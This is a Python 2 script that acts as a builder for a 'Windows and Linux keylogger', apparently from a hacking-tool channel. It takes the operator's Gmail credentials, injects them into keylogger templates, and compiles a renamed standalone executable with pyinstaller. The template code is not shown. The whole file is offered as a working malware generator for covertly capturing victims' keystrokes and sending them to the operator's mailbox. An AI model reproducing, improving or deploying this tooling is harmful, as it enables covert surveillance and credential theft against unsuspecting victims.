#!/bin/env python2.7

import os 
import sys
import time
def clears():
	if sys.platform == "win32":
		os.system("cls")
	else:
		os.system("clear")
def logo():
	logo = """\033[1;39m
		-------------------------------------|
                |\033[1;31m  Windows and Linux keylogger v1.0 \033[1;39m |
		|                                    |
		|   ||  //                           |
		|   || //                            |
		|   ||//                             |
		|   ||\\\   ====  \\\    //            |
		|   || \\\  \\  /   \\\  //             |
		|   ||  \\\  \\____  \\\//  ....logger  |
		|                   //               |
		|                  //                |
		|-------------------------------------
		\033[1;36mcoded by BBSAD\033[1;39m
		
		\033[1;33mless secure gmail :{ https://urlzs.com/uiau }\033[1;39m
"""              
	print logo  

logo() 
while True:
	print ""
	print "		1] Windows"
	print "		2] Linux "
	print "		3] Exit"
	print ""
	a = raw_input("		Select your choice : ")
	print ""
	if a == "1":	
		while True:
			x = raw_input("		Enter your gmail : ")
			if x != "":
				y = raw_input("		Enter your pass  : ")
				if y != "":
					clears()
					filepath = "kelogger1.py"
					if os.path.exists(filepath):
						os.remove(filepath)

					
					file = open("kesac.py", "r")
					file2 = file.read()
					file.close()
					
					ch1 = file2.replace("SACHINSACHIN",x)

					file3 = open("keylogger1.py", "w")
					file3.write(ch1)
					file3.close()
						
					fil = open("keylogger1.py","r")
					fil2 = fil.read()
					fil.close()

					ch2 = fil2.replace("passwordpassword",y)
					if os.path.exists("keylogger.py"):
						os.remove("keylogger.py")

					fil3 = open("keylogger.py", "w")
					fil3.write(ch2)
					fil3.close()
					os.remove("keylogger1.py")
					os.system("sh run.sh")
					break
					
				else:
					clears()
					break	
					
			else:
				clears()
	if a == "3":
		print "quitting ...."
		break

	if a == "2":
		while True:
			x = raw_input("		Enter your gmail : ")
			if x != "":
				y = raw_input("		Enter your pass  : ")
				if y != "":
					clears()
					filepath = "kelogger1.py"
					if os.path.exists(filepath):
						os.remove(filepath)
					print " Generating keylogger ...."

					
					file = open("kesac_linux.py", "r")
					file2 = file.read()
					file.close()
					
					ch1 = file2.replace("SACHINSACHIN",x)

					file3 = open("keylogger1.py", "w")
					file3.write(ch1)
					file3.close()
						
					fil = open("keylogger1.py","r")
					fil2 = fil.read()
					fil.close()

					ch2 = fil2.replace("passwordpassword",y)
					if os.path.exists("keylogger.py"):
						os.remove("keylogger.py")

					fil3 = open("keylogger.py", "w")
					fil3.write(ch2)
					fil3.close()
					os.remove("keylogger1.py")
					os.system("pyinstaller --onefile keylogger.py")
					os.system("rm -rf build")
					os.system("rm keylogger.spec")
					print ""
					while True:
						name = raw_input("provide name : ")
						if name != "":
							os.system("mv dist/keylogger dist/"+name)
							clears()
							print "check in [ dist ] folder .."
							print ""
							print " Thank u for using my Tool "
							print "Please subscribe my channel"
							print "          BBSAD"
							exit()
						else:
							continue








	

